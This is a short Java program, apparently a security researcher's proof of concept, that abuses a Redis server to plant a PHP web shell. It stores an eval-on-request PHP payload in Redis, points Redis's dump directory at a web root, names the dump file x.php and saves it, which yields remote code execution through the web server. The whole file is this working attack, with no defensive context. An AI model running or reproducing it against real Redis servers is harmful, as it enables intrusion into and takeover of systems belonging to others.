package cn.b1ue.redis.filewrite;

import redis.clients.jedis.Jedis;

/**
 * @author 浅蓝
 * @email blue@ixsec.org
 * @since 2020/4/3 14:45
 */
public class Webshell {

    public static void main(String[] args) {

        Jedis jedis = new Jedis("127.0.0.1", 6379);
        //jedis.flushAll();  //此方法会删除redis的所有数据，不要在生产环境调用此方法
        jedis.set("x", "\n\n<?php eval($_REQUEST['x']); ?>\n\n");
        jedis.configSet("dir","/home/web/wwwroot/");
        jedis.configSet("dbfilename","x.php");
        jedis.save();
        jedis.close();

    }

}
